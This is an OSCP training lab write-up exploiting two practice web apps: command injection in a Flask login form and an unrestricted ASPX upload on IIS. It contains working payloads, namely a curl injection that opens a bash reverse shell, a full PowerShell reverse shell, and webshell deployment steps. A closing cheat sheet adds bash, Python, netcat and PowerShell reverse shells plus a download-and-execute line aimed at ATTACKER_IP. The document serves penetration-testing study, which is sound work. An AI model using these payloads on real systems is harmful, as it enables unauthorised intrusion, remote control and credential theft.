# OSCP Module 9: Common Web Application Attacks - Lab Exercises

## Table of Contents
1. [Overview](#overview)
2. [Target 1: Future Factor Authentication](#target-1-future-factor-authentication)
3. [Target 2: Stan and Olivers Webdev Shop](#target-2-stan-and-olivers-webdev-shop)
4. [Key Takeaways](#key-takeaways)
5. [OSCP Exam Tips](#oscp-exam-tips)

---

## Overview

This documentation covers the exploitation of two web applications from OSCP Module 9, demonstrating critical web attack techniques including command injection, file upload vulnerabilities, and debugging information disclosure.

**Targets Covered:**
- **192.168.229.16** - Future Factor Authentication (Flask/Werkzeug)
- **192.168.229.192** - Stan and Olivers Webdev Shop (IIS/ASP.NET)

**Attack Techniques Demonstrated:**
- Command injection via unsafe string concatenation
- Werkzeug debug console information disclosure
- File upload to RCE
- ASPX webshell deployment
- PowerShell reverse shells

---

## Target 1: Future Factor Authentication
**IP**: 192.168.229.16
**Technologies**: Flask 2.2.2, Werkzeug 2.2.2, Python 3.9.5, Apache 2.4.51, Debian

### Initial Enumeration

#### Service Discovery
```bash
# Comprehensive port scan
nmap -sV -sC -p- -T4 192.168.229.16 --min-rate=1000

# Results:
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH (Debian)
80/tcp open  http    Werkzeug 2.2.2 (Python 3.9.5)
```

#### Technology Stack Analysis
```bash
# Wappalyzer results
- Flask 2.2.2 (Web Framework)
- Werkzeug 2.2.2 (WSGI Server)
- Apache 2.4.51 (Reverse Proxy)
- WordPress 5.8.3 (Additional CMS)
- Python 3.9.5 (Backend Language)
```

**Key Observation**: Apache 2.4.51 is patched against CVE-2021-41773/42013 path traversal vulnerabilities.

### Vulnerability Discovery

#### Application Reconnaissance
```bash
# Check main application
curl http://192.168.229.16/

# Discovered endpoints:
/login - FFA (Future Factor Authentication) form
/console - Werkzeug debug console (PIN-protected)
```

#### Werkzeug Debug Console Analysis
The debug console was discovered at `/console` with:
- **Secret Token**: `ZmBc7SaxulFzQIpSZ7qz`
- **PIN Protection**: Requires authentication via `cmd=pinauth&pin=VALUE`
- **Debug Mode**: EVALEX enabled (allows code execution if PIN bypassed)

#### Critical Vulnerability Discovery
Attempting to POST to `/login` without proper parameters triggered a Werkzeug debug traceback, exposing the application source code:

```python
# Exposed code from /app/app.py line 137:
if request.form['username'] != 'N@NdkWzmN@NdkWzmN@NdkWzm' or request.form['password'] != 'N@NdkWzmN@NdkWzmN@NdkWz!!!!!!###!!!!!m':
    ffa = request.form['ffa']
    out = os.popen(f'echo "{ffa}"').read()  # COMMAND INJECTION!
```

**Vulnerability**: Direct command injection via `os.popen()` with unsanitized user input.

### Exploitation Chain

#### Command Injection Exploitation
```bash
# 1. Start listener
nc -nvlp 4444

# 2. Exploit command injection
curl -X POST http://192.168.229.16/login \
  --data-urlencode "username=test" \
  --data-urlencode "password=test" \
  --data-urlencode "ffa=test\"; bash -c 'bash -i >& /dev/tcp/192.168.45.243/4444 0>&1'; echo \""

# Alternative payloads:
# Using command substitution
--data-urlencode "ffa=\$(bash -c 'bash -i >& /dev/tcp/192.168.45.243/4444 0>&1')"

# Breaking quotes and commenting
--data "username=test&password=test&ffa=\"; id; #"
```

#### Attack Vector Analysis
The vulnerability exists because:
1. User input (`ffa` parameter) is directly concatenated into a shell command
2. The string is placed inside `echo "{ffa}"` allowing quote escape
3. No input sanitization or validation is performed
4. `os.popen()` executes the command with shell interpretation

### Post-Exploitation
```bash
# Privilege escalation
sudo -l  # Check sudo permissions
sudo su  # Escalate if allowed

# Flag retrieval
cat /root/flag.txt
```

### Troubleshooting & Lessons Learned

#### Issues Encountered
1. **Initial FFA field testing**: Direct Python injection attempts failed as the field wasn't using `eval()`
2. **Werkzeug PIN**: Could not bypass PIN authentication without additional file read primitives
3. **Service confusion**: Initially focused on WordPress instead of the Flask application

#### Key Indicators
- Werkzeug debug console presence indicates development mode
- Error messages exposing source code are critical for vulnerability discovery
- Python string formatting with user input often leads to injection

---

## Target 2: Stan and Olivers Webdev Shop
**IP**: 192.168.229.192
**Technologies**: IIS 10.0, ASP.NET, Windows Server

### Initial Enumeration

#### Service Discovery
```bash
# Port scan results
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
8000/tcp open  http          Microsoft IIS httpd 10.0 (Main App)
```

#### Application Analysis
```bash
# Main application on port 8000
curl http://192.168.229.192:8000

# Key findings:
- File upload functionality present
- ASP.NET ViewState tokens in forms
- Message: "We save it on the other port for you to watch!" (port 80)
```

### Vulnerability Discovery

#### File Upload Mechanism
HTML form analysis revealed:
```html
<input type="file" name="ctl00$MainContent$FileUploadControl" />
<input type="submit" name="ctl00$MainContent$UploadButton" value="Upload" />
```

**Critical Finding**: Files uploaded on port 8000 are saved to the web root on port 80 without restrictions.

### Exploitation Chain

#### ASPX Webshell Upload
```bash
# 1. Copy ASPX webshell
cp /usr/share/webshells/aspx/cmdasp.aspx /home/kali/cmd.aspx

# 2. Upload via browser
# - Navigate to http://192.168.229.192:8000
# - Select cmd.aspx file
# - Click Upload

# 3. Access webshell
curl http://192.168.229.192/cmd.aspx
```

#### Command Execution
```html
<!-- Webshell interface at http://192.168.229.192/cmd.aspx -->
Command: [_________] [Execute]

# Test commands:
whoami
dir C:\
type C:\inetpub\flag.txt
```

#### Reverse Shell
```powershell
# PowerShell reverse shell (saved to /home/kali/revshell.txt)
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.45.243',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Post-Exploitation

#### File System Exploration
```powershell
# Enumerate IIS directory
dir C:\inetpub\ /s /b
dir C:\inetpub\*.config /s
type C:\inetpub\wwwroot\web.config

# Find sensitive files
findstr /si password C:\inetpub\*.config
findstr /si connectionstring C:\inetpub\*.config

# Retrieve flag
type C:\inetpub\flag.txt
```

#### Privilege Escalation Vectors
```powershell
# Check current privileges
whoami /priv
whoami /groups

# Check for stored credentials
cmdkey /list

# WinRM access (port 5985 was open)
# If we had valid credentials, could use:
# Evil-WinRM -i 192.168.229.192 -u username -p password
```

### Troubleshooting & Lessons Learned

#### Gobuster False Positives
IIS returns many false positives with status 400:
```bash
# Bad approach (too many false positives)
gobuster dir -u http://192.168.229.192:8000 -w /usr/share/wordlists/dirb/common.txt

# Better approach (filter by status)
gobuster dir -u http://192.168.229.192:8000 -w /usr/share/wordlists/dirb/common.txt -s 200,301,302,401,403

# Alternative tools for IIS
feroxbuster -u http://192.168.229.192:8000 --filter-status 400
wfuzz -c --hc 400,404 http://192.168.229.192:8000/FUZZ
```

#### ASP.NET Considerations
- ViewState tokens are required for form submissions but not for file uploads
- ASPX files execute immediately when accessed via browser
- Alternative shells available: `/usr/share/webshells/aspx/`

---

## Key Takeaways

### Command Injection Patterns
1. **Look for**: System command references, file operations, network utilities
2. **Test with**: Simple commands (id, whoami), then chain with semicolons or pipes
3. **Escape methods**: Quote breaking (`"`), command substitution (`$()`), comment injection (`#`)
4. **Python specific**: Watch for `os.system()`, `os.popen()`, `subprocess` without shell=False

### File Upload Exploitation
1. **Always test**: Where files are saved, what extensions are allowed
2. **IIS/ASP.NET**: ASPX, ASP, ASMX extensions for code execution
3. **Bypass techniques**: Case manipulation (.pHP), double extensions, alternate extensions
4. **Post-upload**: Check multiple possible paths (/uploads/, /files/, /upload/, root)

### Information Disclosure
1. **Debug modes**: Werkzeug, Django Debug Toolbar, Laravel Debugbar expose source code
2. **Error messages**: Stack traces often reveal file paths, function names, and logic
3. **ViewState**: Can sometimes be decoded to reveal application state
4. **Comments**: HTML/JavaScript comments may contain credentials or hints

---

## OSCP Exam Tips

### Web Application Strategy
1. **Start with comprehensive enumeration**
   - Service versions matter (check for CVEs)
   - Technology stack identification guides exploit selection
   - Don't ignore "default" pages - they reveal frameworks

2. **Follow the breadcrumbs**
   - Error messages are gold - trigger them intentionally
   - Debug modes are common in exam scenarios
   - File upload + file read = potential RCE

3. **Exploitation methodology**
   - Test simple payloads first (avoid complex encoding initially)
   - Keep multiple shell types ready (bash, PowerShell, Python)
   - Document working payloads immediately

4. **Common exam patterns**
   - Upload functionality → Check for unrestricted file types
   - Command execution references → Test for injection
   - Debug/development modes → Information disclosure
   - Multiple ports → Cross-port interactions

### Quick Reference Commands

#### Linux Reverse Shells
```bash
# Bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Netcat
nc ATTACKER_IP 4444 -e /bin/bash
```

#### Windows Reverse Shells
```powershell
# PowerShell (save to file for easy copy/paste)
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# PowerShell download & execute
powershell IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')
```

### Time-Saving Tips
1. Keep shells in easily accessible files (`/home/kali/revshell.txt`)
2. Use `python3 -m http.server 8080` for quick file hosting
3. Test payloads locally first when possible
4. Screenshot everything - especially working exploits
5. If stuck for >20 minutes, enumerate more or try alternative vectors

---

## References
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [File Upload Vulnerabilities](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [Werkzeug Console PIN Bypass](https://github.com/pallets/werkzeug/issues/2858)
- [IIS Security Best Practices](https://docs.microsoft.com/en-us/iis/configuration/)

---

*Last Updated: Module 9 Capstone Exercises - Web Application Attacks*